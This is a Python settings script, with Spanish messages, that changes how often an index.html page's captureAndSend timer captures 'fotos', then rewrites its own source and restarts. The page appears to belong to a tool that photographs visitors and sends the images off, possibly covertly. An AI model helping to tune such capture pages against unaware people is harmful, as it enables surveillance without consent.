import os
import sys
def get_dirname(find_file):
    ruta_absoluta = os.path.abspath(find_file)
    directname = os.path.dirname(ruta_absoluta)
    return directname

sys.path.append(get_dirname('../../../modulo/modulo.py'))

from modulo import ask_seconds_fotos, ascii_randomly_time, zph_style
from config import reiniciar_script

def do_change():
    print()
    zph_style.to_style("SEGUNDOS PREDETERMINADOS: ")
    print(3)#id1
    find_file = get_dirname(__file__)+'/index.html'
    search = 'setInterval(captureAndSend, 3000);'
    with open(find_file, 'r') as file:
        content = file.read()
    print()
    ask = ask_seconds_fotos()
    if ask == None:
        return
    elif ask == 1:
        return
    else:
        pass
    zph_style.to_style(f"AHORA LAS FOTOS SE CAPTURARAN CADA {ask} SEGUNDOS")
    replaced = content.replace(search, f'setInterval(captureAndSend, {ask}000);')
    with open(find_file, 'w') as archivo:
        archivo.write(replaced)
    
    with open(__file__, 'r') as mfile:
        mcontent = mfile.read()
    replaced_mfile = mcontent.replace(search, f'setInterval(captureAndSend, {ask}000);')    
    with open(__file__, 'w') as ffile:
        ffile.write(replaced_mfile)
    with open(__file__, "r") as impfile:
        impcontent = impfile.read()
    imp_replaced = impcontent.replace('print(3)#id1', f'print({ask})#id1')
    with open(__file__, 'w') as wimp:
        wimp.write(imp_replaced)
    print("\n")
    zph_style.alert("REINICANDO PARA GUARDAR CAMBIOS", 0.02)
    reiniciar_script()
